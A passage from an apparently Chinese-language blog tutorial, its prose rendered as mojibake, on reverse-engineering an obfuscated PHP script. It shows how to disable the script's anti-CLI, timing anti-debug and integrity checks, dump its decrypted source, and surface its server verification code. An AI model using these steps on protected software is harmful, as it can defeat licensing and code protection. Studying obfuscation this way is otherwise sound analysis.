<p>ç„¶åå¯ä»¥çœ‹åˆ°æœ‰é¢œè‰²çš„ä»£ç æœ€æœ«å°¾æœ‰ <code>return *** ?&gt;</code> æ¥ç»“æŸè„šæœ¬è¿è¡Œï¼Œè¿™è¯´æ˜ç»“æŸæ ‡ç­¾åé¢çš„æ•°æ®éƒ½ä¸ä¼šè¢«æ­£å¸¸è¾“å‡ºï¼Œåé¢æå¯èƒ½æ˜¯<code>index.php</code> æºç ï¼Œè€Œå‰é¢çš„ php ä»£ç åªæ˜¯ç”¨æ¥åŠ å¯†çš„ã€‚</p>
<hr>
<h2 id="è§£ç å‡†å¤‡"><a href="#è§£ç å‡†å¤‡" class="headerlink" title="è§£ç å‡†å¤‡"></a>è§£ç å‡†å¤‡</h2><p>å› ä¸ºæˆ‘çš„ <code>IDE</code> æ˜¯ <code>VSCode</code>ï¼Œæ‰€ä»¥å®‰è£…äº† <code>PHP Debug</code> æ’ä»¶<br>ä»¥åŠéœ€è¦è¿›è¡Œä»£ç ç¼©è¿›æ ¼å¼åŒ–<br>ç„¶åæ‰¾åˆ°äº†è¿™ä¸ª<a href="https://github.com/nikic/PHP-Parser" target="_blank" rel="noopener">å·¥å…·PHP-Parser</a></p>
<p>ä½¿ç”¨å·¥å…·å‰è¦å…ˆå®‰è£… <code>composer</code><br><a href="https://getcomposer.org/download/" target="_blank" rel="noopener">composerä¸‹è½½åœ°å€</a><br><a href="https://developer.aliyun.com/composer" target="_blank" rel="noopener">é˜¿é‡Œäº‘é•œåƒ</a></p>
<p>å®‰è£…å¥½ <code>composer</code> åï¼Œè¿›å…¥ä¸‹å¥½çš„ <code>Parser</code> æ–‡ä»¶å¤¹ï¼Œç”¨å‘½ä»¤è¾“å…¥</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">bash</div></div><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">composer update</span><br></pre></td></tr></table></figure></div>

<p>è®©å…¶ç”Ÿæˆæ‰€éœ€è¦çš„åº“ï¼Œç„¶åå°†ä¸‹é¢çš„ä»£ç ä¿å­˜æˆä¸€ä¸ªæ–°çš„æ–‡ä»¶(ä¾‹å¦‚ <code>format.php</code>)</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">php</div></div><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">use</span> <span class="title">PhpParser</span>\<span class="title">Error</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">PhpParser</span>\<span class="title">ParserFactory</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">PhpParser</span>\<span class="title">PrettyPrinter</span>;</span><br><span class="line"><span class="keyword">require</span> <span class="string">'vendor/autoload.php'</span>;</span><br><span class="line">$code = file_get_contents(<span class="string">'index.php'</span>);</span><br><span class="line">$parser = (<span class="keyword">new</span> ParserFactory)-&gt;create(ParserFactory::PREFER_PHP7);</span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">    $ast = $parser-&gt;parse($code);</span><br><span class="line">&#125; <span class="keyword">catch</span> (Error $error) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"Parse error: &#123;$error-&gt;getMessage()&#125;\n"</span>;</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line">$prettyPrinter = <span class="keyword">new</span> PrettyPrinter\Standard;</span><br><span class="line">$prettyCode = $prettyPrinter-&gt;prettyPrintFile($ast);</span><br><span class="line">file_put_contents(<span class="string">'index2.php'</span>, $prettyCode);</span><br></pre></td></tr></table></figure></div>

<p>ç„¶åæ‰§è¡Œå‘½ä»¤ <code>php format.php</code><br>ç„¶åå°†æ–°ç”Ÿæˆçš„æ–‡ä»¶ï¼Œä»¥ <code>Western (ISO 8859-1)</code> ç¼–ç å½¢å¼æ‰“å¼€ï¼Œè¿™æ ·å¯ä»¥æ˜¾ç¤ºæ›´å¤šéå¯æ˜¾ç¤ºå­—ç¬¦è€Œä¸æ˜¯å¤šå­—èŠ‚çš„å­—ç¬¦é›†</p>
<p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/php_decode2.png" data-fancybox="group" data-caption="decode2" class="fancybox"><img alt="decode2" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/php_decode2.png" class="lazyload" title="decode2"></a></p>
<hr>
<h2 id="è°ƒè¯•"><a href="#è°ƒè¯•" class="headerlink" title="è°ƒè¯•"></a>è°ƒè¯•</h2><p>å¼€å¤´ä¸¤è¡Œéœ€è¦å…ˆæ³¨é‡Šæ‰ï¼Œé˜²æ­¢è°ƒè¯•è¿‡ç¨‹å‡ºç°ä¸€äº›é—®é¢˜</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">php</div></div><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">ini_set(<span class="string">"display_errors"</span>, <span class="number">0</span>);</span><br></pre></td></tr></table></figure></div>

<p>ä½¿ç”¨ <code>VSCode</code> çš„è°ƒè¯•åŠŸèƒ½ï¼Œæˆ‘ä»¬å¯ä»¥æ–¹ä¾¿çš„æŸ¥çœ‹å˜é‡çš„å…·ä½“å†…å®¹ã€‚</p>
<p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/php_decode3.png" data-fancybox="group" data-caption="decode3" class="fancybox"><img alt="decode3" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/php_decode3.png" class="lazyload" title="decode3"></a></p>
<hr>
<h3 id="33è¡Œ"><a href="#33è¡Œ" class="headerlink" title="33è¡Œ"></a>33è¡Œ</h3><p>ç›´åˆ°è°ƒè¯•åˆ°è¿™ä¸€è¡Œï¼Œå‘ç°ç›´æ¥è·³å‡ºäº†ã€‚</p>
<p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/php_decode4.png" data-fancybox="group" data-caption="decode4" class="fancybox"><img alt="decode4" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/php_decode4.png" class="lazyload" title="decode4"></a></p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">php</div></div><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">php_sapi_name() == <span class="string">'cli'</span> ? <span class="keyword">die</span>() : <span class="string">''</span>;</span><br></pre></td></tr></table></figure></div>

<p>å› ä¸ºæ˜¯ç”¨å‘½ä»¤è¡Œè¿è¡Œè°ƒè¯•ï¼Œæ‰€ä»¥æ‰§è¡Œå®Œè¿™ä¸€å¥ï¼Œç¨‹åºå°±ç»“æŸäº†ã€‚<br>ç„¶åå°†è¿™ä¸€è¡Œæ³¨é‡Šæ‰ï¼Œåœ¨ä»–ä¸‹é¢ä¸‹æ–­ç‚¹ã€‚é‡æ–°è¿è¡Œç¨‹åºã€‚</p>
<hr>
<p>34è¡Œæ˜¯å°±æ˜¯è¯»å–å½“å‰æ–‡ä»¶ï¼Œè¿™å¥è¯æ²¡æœ‰ä»€ä¹ˆé—®é¢˜ã€‚</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">php</div></div><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$f = file_get_contents(constant(<span class="string">'jnggfmpt'</span>));</span><br></pre></td></tr></table></figure></div>

<p>ç„¶åå°±åˆæ˜¯éªŒè¯è¿è¡Œç¯å¢ƒã€‚</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">php</div></div><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>($_SERVER[<span class="string">'HTTP_HOST'</span>]) &amp;&amp; !<span class="keyword">isset</span>($_SERVER[<span class="string">'SERVER_ADDR'</span>]) &amp;&amp; !<span class="keyword">isset</span>($_SERVER[<span class="string">'REMOTE_ADDR'</span>])) &#123;</span><br><span class="line">    <span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/php_decode5.png" data-fancybox="group" data-caption="decode5" class="fancybox"><img alt="decode5" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/php_decode5.png" class="lazyload" title="decode5"></a></p>
<h3 id="ç„¶åçœ‹åé¢çš„-38-42è¡Œä»£ç "><a href="#ç„¶åçœ‹åé¢çš„-38-42è¡Œä»£ç " class="headerlink" title="ç„¶åçœ‹åé¢çš„ 38-42è¡Œä»£ç "></a>ç„¶åçœ‹åé¢çš„ 38-42è¡Œä»£ç </h3><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">php</div></div><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">argc = microtime(<span class="keyword">true</span>) * <span class="number">1000</span>;</span><br><span class="line"><span class="keyword">eval</span>(<span class="string">""</span>);</span><br><span class="line"><span class="keyword">if</span> (microtime(<span class="keyword">true</span>) * <span class="number">1000</span> - argc &gt; <span class="number">100</span>) &#123;</span><br><span class="line">    <span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>æŸ¥äº†ä¸‹ï¼Œæ˜¯ç”¨æ¥é˜²æ­¢ä¸‹æ–­ç‚¹è°ƒè¯•çš„ï¼Œå¦‚æœä¸‹æ–­ç‚¹è°ƒè¯•ï¼Œè¿™é‡Œå°±è¶…è¿‡ 100 æ¯«ç§’ï¼Œç„¶åå°±é€€å‡ºäº†ã€‚<br>å› æ­¤å†³å®šç›´æ¥åœ¨è¿™æ¡è¯­å¥ä¹‹åä¸‹æ–­ç‚¹ï¼Œè®©ä»£ç ä¸€è¿ä¸²æ‰§è¡Œå®Œï¼Œè¿™æ ·å°±ä¸ä¼šè¶…è¿‡ 100 æ¯«ç§’äº†,ç›´æ¥æ³¨é‡Šæ‰ä¹Ÿè¡Œ<br>ç„¶åå†æ¥çœ‹ä¸€ä¸‹åé¢43è¡Œè¿™ä¸ª <code>eval</code><br>å›æ˜¾ç»“æœè·‘åˆ°äº†71è¡Œè¿™é‡Œ</p>
<p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/php_decode6.png" data-fancybox="group" data-caption="decode6" class="fancybox"><img alt="decode6" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/php_decode6.png" class="lazyload" title="decode6"></a></p>
<p>çœ‹èµ·æ¥å¥½åƒæ²¡ä»€ä¹ˆå¸®åŠ©ï¼Œæ³¨é‡Šæ‰ä¹‹å</p>
<h3 id="çœ‹44è¡Œ"><a href="#çœ‹44è¡Œ" class="headerlink" title="çœ‹44è¡Œ"></a>çœ‹44è¡Œ</h3><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">php</div></div><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">!strpos(decode_func(substr($f, <span class="number">-45</span>, <span class="number">-1</span>)), md5(substr($f, <span class="number">0</span>, <span class="number">-46</span>))) ? $undefined1() : $undefined2;</span><br></pre></td></tr></table></figure></div>

<p>ç”¨æ¥æ ¡éªŒæ•°æ®å®Œæ•´æ€§çš„ä»£ç ï¼Œè¿™é‡Œçš„ <code>$undefined1</code> å’Œ <code>$undefined2</code> éƒ½æ²¡æœ‰å®šä¹‰ã€‚å¦‚æœéªŒè¯å¤±è´¥ï¼Œå°±ä¼šè°ƒç”¨ <code>$undefined1</code> ä¼šç›´æ¥ <code>Error</code> é€€å‡ºç¨‹åºã€‚è€Œå¦‚æœéªŒè¯æˆåŠŸï¼Œè™½ç„¶ <code>$undefined2</code> å˜é‡ä¸å­˜åœ¨ï¼Œä½†æ˜¯åªæ˜¯ä¸€ä¸ª <code>Warning</code>ï¼Œæ²¡æœ‰å¤ªå¤§é—®é¢˜ã€‚</p>
<p>å…¶ä¸­çš„ <code>decode_func</code> å°±æ˜¯åŠ å¯†ä»£ç ä¸­æœ€åä¸€ä¸ªå‡½æ•°ï¼Œä¸“é—¨è´Ÿè´£å­—ç¬¦ä¸²è§£ç çš„ã€‚<br>éªŒè¯æ–¹æ³•å°±æ˜¯æŠŠæ–‡ä»¶å°¾éƒ¨åˆ†è§£å¯†å’Œå‰é¢çš„æ–‡ä»¶ä¸»ä½“éƒ¨åˆ†çš„ md5 å¯¹æ¯”ï¼Œè¿™æ¬¡æ‰§è¡Œè‚¯å®šåˆä¸èƒ½é€šè¿‡ã€‚<br>é€€å‡ºç¨‹åºï¼Œæ³¨é‡Šæ‰ï¼Œå†é‡æ–°è¿è¡Œã€‚</p>
<hr>
<h3 id="47è¡Œæ‰¾åˆ°å…³é”®æ€§ä»£ç "><a href="#47è¡Œæ‰¾åˆ°å…³é”®æ€§ä»£ç " class="headerlink" title="47è¡Œæ‰¾åˆ°å…³é”®æ€§ä»£ç "></a>47è¡Œæ‰¾åˆ°å…³é”®æ€§ä»£ç </h3><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">php</div></div><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$decrypted = str_rot13(@gzuncompress(decode_func(substr($f, <span class="number">-1522</span>, <span class="number">-46</span>))));</span><br></pre></td></tr></table></figure></div>

<p>åŒæ—¶å¯ä»¥çœ‹åˆ°å·²ç» <code>return</code> åŠ å¯†å‰çš„ä»£ç äº†ï¼Œä¸Šè¿°çš„ <code>-1522</code>å°±æ˜¯æœ€å…ˆæåˆ°çš„åŠ å¯†ä»£ç æœ«å°¾ <code>?&gt;</code> åçš„ç¬¬ä¸€ä¸ªå­—ç¬¦</p>
<p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/php_decode7.png" data-fancybox="group" data-caption="decode7" class="fancybox"><img alt="decode7" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/php_decode7.png" class="lazyload" title="decode7"></a></p>
<h3 id="ç„¶åè·³åˆ°æœ€å"><a href="#ç„¶åè·³åˆ°æœ€å" class="headerlink" title="ç„¶åè·³åˆ°æœ€å"></a>ç„¶åè·³åˆ°æœ€å</h3><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">php</div></div><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$f_varname = <span class="string">'_f_'</span>;</span><br><span class="line">$decrypted = check_and_decrypt($&#123;$f_varname&#125;);</span><br><span class="line">set_include_path(dirname($&#123;$f_varname&#125;));</span><br><span class="line">$base64_encoded_decrypted = base64_encode($decrypted);</span><br><span class="line">$eval_string = <span class="string">'eval(base64_decode($base64_encoded_decrypted));'</span>;</span><br><span class="line">$result = <span class="keyword">eval</span>($eval_string);</span><br><span class="line">set_include_path(dirname($&#123;$f_varname&#125;));</span><br><span class="line"><span class="keyword">return</span> $result;</span><br></pre></td></tr></table></figure></div>

<p>æ€ä¹ˆæ‰“å°å‡ºæ¥å‘¢<br>ç›´æ¥åœ¨ <code>$decrypted</code> åé¢åŠ ä¸Šä¸€è¡Œ <code>file_put_contents</code> å°±å¯ä»¥äº†ã€‚</p>
<p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/php_decode7_2.png" data-fancybox="group" data-caption="decode7_2" class="fancybox"><img alt="decode7_2" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/php_decode7_2.png" class="lazyload" title="decode7_2"></a></p>
<p>ç„¶åä¾¿å¯ä»¥çœ‹åˆ°è§£å¯†åçš„æºç </p>
<p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/php_decode8.png" data-fancybox="group" data-caption="decode8" class="fancybox"><img alt="decode8" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/php_decode8.png" class="lazyload" title="decode8"></a></p>
<p>å¦‚æœå°†ä¸Šè¿°çš„ 35è¡Œ <code>server_host</code> æ”¹æˆ <code>&#39;127.0.0.1&#39;</code> è¿˜å¯ä»¥çœ‹åˆ°æœåŠ¡å™¨è¿”å›çš„è¯·æ±‚éªŒè¯æ•°æ®ä»£ç </p>
<h3 id="50è¡Œ-decode-func"><a href="#50è¡Œ-decode-func" class="headerlink" title="50è¡Œ decode_func"></a>50è¡Œ decode_func</h3><p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/php_decode9.png" data-fancybox="group" data-caption="decode9" class="fancybox"><img alt="decode9" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/php_decode9.png" class="lazyload" title="decode9"></a></p>
<h2 id="åè¯"><a href="#åè¯" class="headerlink" title="åè¯"></a>åè¯</h2><p>æ„Ÿè°¢ <a href="https://www.52pojie.cn/thread-693641-1-1.html" target="_blank" rel="noopener">Ganlv å¸ˆå‚…</a> çš„ä¸€è·¯æŒ‡å¯¼</p>
<h3 id="å¤§è‡´çš„åŠ å¯†æºç "><a href="#å¤§è‡´çš„åŠ å¯†æºç " class="headerlink" title="å¤§è‡´çš„åŠ å¯†æºç "></a>å¤§è‡´çš„åŠ å¯†æºç </h3><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">php</div></div><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// å…ˆæŠŠè¿™ä¸¤è¡Œå»æ‰ï¼Œé˜²æ­¢å‡ºç°ä»€ä¹ˆé—®é¢˜ï¼Œæˆ‘ä»¬è¿˜ä»€ä¹ˆéƒ½ä¸çŸ¥é“ã€‚</span></span><br><span class="line"><span class="comment">// error_reporting(0);</span></span><br><span class="line"><span class="comment">// ini_set("display_errors", 0);</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!defined(<span class="string">'jnggfmpt'</span>)) &#123;</span><br><span class="line">    define(<span class="string">'jnggfmpt'</span>, <span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (function_exists(<span class="string">'func2'</span>) == <span class="keyword">false</span>) &#123;</span><br><span class="line">        <span class="comment">// ç¬¬ä¸€ä¸ªå‡½æ•°è¿”å› 'base64_decode' ï¼Œè¿™ä¸ªå‡½æ•°ä¸ä¾èµ–å…¶ä»–ä»»ä½•å‡½æ•°ï¼Œå•çº¯åœ°è¿”å›ä¸€ä¸ªå­—ç¬¦ä¸² 'base64_decode'ã€‚</span></span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">func1</span><span class="params">()</span></span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            $v1 = <span class="string">'6f6e66723634'</span>;</span><br><span class="line">            $v2 = <span class="string">'pa'</span>;</span><br><span class="line">            $v3 = <span class="string">'7374725f'</span>;</span><br><span class="line">            $v4 = <span class="string">'H'</span> . <span class="string">'*'</span>;</span><br><span class="line">            $v2 .= <span class="string">'ck'</span>; <span class="comment">// $v2 = 'pack';</span></span><br><span class="line">            $v1 .= <span class="string">'5f717270627172'</span>; <span class="comment">// $v1 = '6f6e667236345f717270627172';</span></span><br><span class="line">            $v3 .= <span class="string">'726f743133'</span>; <span class="comment">// $v3 = '7374725f726f743133';</span></span><br><span class="line">            <span class="comment">// $v5 = $v2($v4, $v3);</span></span><br><span class="line">            $v5 = pack(<span class="string">'H*'</span>, <span class="string">'7374725f726f743133'</span>);</span><br><span class="line">            <span class="comment">// $v5 = 'str_rot13';</span></span><br><span class="line">            <span class="comment">// $v6 = $v5($v2($v4, $v1));</span></span><br><span class="line">            $v6 = str_rot13(pack(<span class="string">'H*'</span>, <span class="string">'6f6e667236345f717270627172'</span>));</span><br><span class="line">            <span class="comment">// $v6 = 'base64_decode';</span></span><br><span class="line">            <span class="keyword">return</span> $v6;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// ç¬¬äºŒä¸ªå‡½æ•°æ¥å—ä¸¤ä¸ªå‚æ•°ï¼Œè¦æ³¨æ„ç¬¬ä¸€ä¸ªå‚æ•°è¿˜æ˜¯ä¸€ä¸ªå¼•ç”¨å‚æ•°ã€‚</span></span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">func2</span><span class="params">(&amp;$arg1, $arg2)</span></span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="comment">// ç¬¬ä¸€å¥æ˜¯ä»¤ä¸€å †å˜é‡ç­‰äº func4</span></span><br><span class="line">            <span class="comment">// $v1 - $v5 éƒ½ä½¿ç”¨ func4 è§£ç ä¸€ä¸ªå­—ç¬¦ä¸²ï¼Œç»“æœå¦‚ä¸‹</span></span><br><span class="line">            $v1 = <span class="string">'str_rot13'</span>;</span><br><span class="line">            $v2 = <span class="string">'strrev'</span>;</span><br><span class="line">            $v3 = <span class="string">'gzuncompress'</span>;</span><br><span class="line">            $v4 = <span class="string">'stripslashes'</span>;</span><br><span class="line">            $v5 = <span class="string">'explode'</span>;</span><br><span class="line">            <span class="comment">// $v6 = $v1($v2($v3($v4(func4('??????')))));</span></span><br><span class="line">            <span class="comment">// $v6 = str_rot13(strrev(gzuncompress(stripslashes(func4('??????')))));</span></span><br><span class="line">            $v6 = <span class="string">',chr,addslashes,rand,gzuncompress,assert_options,assert,file_get_contents,substr,unpack,constant,strpos,create_function,str_rot13,md5,set_include_path,dirname,preg_replace,base64_encode,base64_decode,'</span>;</span><br><span class="line">            <span class="comment">// $v7 = $v5($v6);</span></span><br><span class="line">            <span class="comment">// $v7 = explode($v6);</span></span><br><span class="line">            $v7 = <span class="keyword">array</span>(</span><br><span class="line">                <span class="number">0</span> =&gt; <span class="string">""</span>,</span><br><span class="line">                <span class="number">1</span> =&gt; <span class="string">"chr"</span>,</span><br><span class="line">                <span class="number">2</span> =&gt; <span class="string">"addslashes"</span>,</span><br><span class="line">                <span class="number">3</span> =&gt; <span class="string">"rand"</span>,</span><br><span class="line">                <span class="number">4</span> =&gt; <span class="string">"gzuncompress"</span>,</span><br><span class="line">                <span class="number">5</span> =&gt; <span class="string">"assert_options"</span>,</span><br><span class="line">                <span class="number">6</span> =&gt; <span class="string">"assert"</span>,</span><br><span class="line">                <span class="number">7</span> =&gt; <span class="string">"file_get_contents"</span>,</span><br><span class="line">                <span class="number">8</span> =&gt; <span class="string">"substr"</span>,</span><br><span class="line">                <span class="number">9</span> =&gt; <span class="string">"unpack"</span>,</span><br><span class="line">                <span class="number">10</span> =&gt; <span class="string">"constant"</span>,</span><br><span class="line">                <span class="number">11</span> =&gt; <span class="string">"strpos"</span>,</span><br><span class="line">                <span class="number">12</span> =&gt; <span class="string">"create_function"</span>,</span><br><span class="line">                <span class="number">13</span> =&gt; <span class="string">"str_rot13"</span>,</span><br><span class="line">                <span class="number">14</span> =&gt; <span class="string">"md5"</span>,</span><br><span class="line">                <span class="number">15</span> =&gt; <span class="string">"set_include_path"</span>,</span><br><span class="line">                <span class="number">16</span> =&gt; <span class="string">"dirname"</span>,</span><br><span class="line">                <span class="number">17</span> =&gt; <span class="string">"preg_replace"</span>,</span><br><span class="line">                <span class="number">18</span> =&gt; <span class="string">"base64_encode"</span>,</span><br><span class="line">                <span class="number">19</span> =&gt; <span class="string">"base64_decode"</span>,</span><br><span class="line">                <span class="number">20</span> =&gt; <span class="string">""</span>,</span><br><span class="line">            );</span><br><span class="line">            $arg1 = $v7[$arg2];</span><br><span class="line">            <span class="comment">// çœ‹åˆ°è¿™é‡ŒçŸ¥é“äº†ï¼Œè¿™ä¸ªå‡½æ•°å°±æ˜¯ç”¨æ¥éœ€è¦ç”¨çš„æå–å‡½æ•°åçš„</span></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// ç¬¬ä¸‰ä¸ªå‡½æ•°è¢«ä¸»ç¨‹åºè°ƒç”¨äº†</span></span><br><span class="line">        <span class="comment">// ä¸è¿‡åˆ†æä¹‹åå‘ç°è¿™ä¸ª $arg1 å‚æ•°å¹¶æ²¡æœ‰ç”¨åˆ°</span></span><br><span class="line">        <span class="comment">// è¿™ä¸ªå‡½æ•°çš„å‰åŠéƒ¨åˆ†æ˜¯é˜²æ­¢è°ƒè¯•</span></span><br><span class="line">        <span class="comment">// ååŠéƒ¨åˆ†æ˜¯æå–åé¢åŠ å¯†çš„ä»£ç </span></span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">func3</span><span class="params">($arg1)</span></span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">global</span> $_v1, <span class="comment">// $_v1 = 'file_get_contents';</span></span><br><span class="line">            $_v3, <span class="comment">// $_v3 = 'substr';</span></span><br><span class="line">            $_v4, <span class="comment">// $_v4 = 'assert';</span></span><br><span class="line">            $_v5, <span class="comment">// $_v5 = 'assert_options';</span></span><br><span class="line">            $_v6, <span class="comment">// $_v6 = 'unpack';</span></span><br><span class="line">            $_v7, <span class="comment">// $_v7 = 'constant';</span></span><br><span class="line">            $_v8, <span class="comment">// $_v8 = 'preg_replace';</span></span><br><span class="line">            $_v9, <span class="comment">// $_v9 = 'base64_encode';</span></span><br><span class="line">            $_v10, <span class="comment">// $_v10 = 'gzuncompress';</span></span><br><span class="line">            $_v11, <span class="comment">// $_v11 = 'create_function';</span></span><br><span class="line">            $_v12, <span class="comment">// $_v12 = 'strpos';</span></span><br><span class="line">            $_v13, <span class="comment">// $_v13 = 'addslashes';</span></span><br><span class="line">            $_v14, <span class="comment">// $_v14 = 'str_rot13';</span></span><br><span class="line">            $_v15, <span class="comment">// $_v15 = 'md5';</span></span><br><span class="line">            $_v16, <span class="comment">// $_v16 = 'set_include_path';</span></span><br><span class="line">            $_v17; <span class="comment">// $_v17 = 'dirname';</span></span><br><span class="line">            <span class="comment">// è¿™é‡Œæœ‰ä¸€å †å˜é‡ç­‰äº func4ï¼Œç„¶åç”¨ä»–ä»¬è§£ç å¾—åˆ° $v1 - $v5</span></span><br><span class="line">            $v1 = <span class="string">'php_sapi_name'</span>;</span><br><span class="line">            $v2 = <span class="string">'die'</span>;</span><br><span class="line">            $v3 = <span class="string">'cli'</span>;</span><br><span class="line">            $v4 = <span class="string">'microtime'</span>;</span><br><span class="line">            $v5 = <span class="string">'1000'</span>;</span><br><span class="line">            <span class="comment">// $v1() == $v3 ? $v2() : '';</span></span><br><span class="line">            <span class="comment">// è¿™å¥è¯åœ¨è°ƒè¯•çš„æ—¶å€™éœ€è¦æ³¨é‡Šæ‰</span></span><br><span class="line">            php_sapi_name() == <span class="string">'cli'</span> ? <span class="keyword">die</span>() : <span class="string">''</span>;</span><br><span class="line">            <span class="comment">// file_get_contents(constant(func4('??????')));</span></span><br><span class="line">            $v7 = file_get_contents(<span class="keyword">__FILE__</span>);</span><br><span class="line">            <span class="comment">// $v8 = $v4(true) * $v5;</span></span><br><span class="line">            $v8 = microtime(<span class="keyword">true</span>) * <span class="number">1000</span>;</span><br><span class="line">            <span class="keyword">eval</span>(<span class="string">""</span>);</span><br><span class="line">            <span class="comment">// if ($v4(true) * $v5 - $v8 &gt; 100) &#123;</span></span><br><span class="line">            <span class="comment">// è¿™é‡Œæ˜¯é˜²æ­¢ä¸‹æ–­ç‚¹è°ƒè¯•çš„ï¼Œä¸‹æ–­ç‚¹è°ƒè¯•ï¼Œè¿™é‡Œå°±è¶…è¿‡ 100 æ¯«ç§’äº†ï¼Œç›´æ¥æ³¨é‡Šæ‰</span></span><br><span class="line">            <span class="keyword">if</span> (microtime(<span class="keyword">true</span>) * <span class="number">1000</span> - $v8 &gt; <span class="number">100</span>) &#123;</span><br><span class="line">                <span class="comment">// $v2();</span></span><br><span class="line">                <span class="keyword">die</span>();</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">// eval(func4('??????'));</span></span><br><span class="line">            <span class="keyword">eval</span>(<span class="string">'if(strpos(__FILE__, msvigqgq) !== 0)&#123;$exitfunc();&#125;'</span>);</span><br><span class="line">            <span class="comment">// $_v12(func4($_v3($v7, func4('??????'), func4('??????'))), $_v15($_v3($v7, func4('??????'), func4('??????')))) ? $v9() : $v10;</span></span><br><span class="line">            <span class="comment">// è¿™é‡Œçš„ $v9 å’Œ $v10 éƒ½æ²¡æœ‰å®šä¹‰ï¼Œå¦‚æœéªŒè¯å¤±è´¥ï¼Œå°±ä¼šè°ƒç”¨ $v9 ä¼šç›´æ¥å‡ºé”™é€€å‡ºç¨‹åº</span></span><br><span class="line">            <span class="comment">// è€Œå¦‚æœéªŒè¯æˆåŠŸ $v10 å˜é‡ä¸å­˜åœ¨åˆ™æ²¡é—®é¢˜</span></span><br><span class="line">            <span class="comment">// éªŒè¯æ–¹æ³•å°±æ˜¯æŠŠæ–‡ä»¶å°¾éƒ¨åˆ†è§£å¯†å’Œå‰é¢çš„æ–‡ä»¶ä¸»ä½“éƒ¨åˆ†çš„md5å¯¹æ¯”ï¼Œç›´æ¥æ³¨é‡Šæ‰</span></span><br><span class="line">            !strpos(func4(substr($v7, <span class="number">-45</span>, <span class="number">-1</span>)), md5(substr($v7, <span class="number">0</span>, <span class="number">-46</span>))) ? $v9() : $v10;</span><br><span class="line">            <span class="comment">// è¿™ä¸¤ä¸ªæ•°å€¼æ˜¯é€šè¿‡ func4 è§£ç å¾—åˆ°çš„</span></span><br><span class="line">            $v11 = <span class="string">'-2586'</span>;</span><br><span class="line">            $v12 = <span 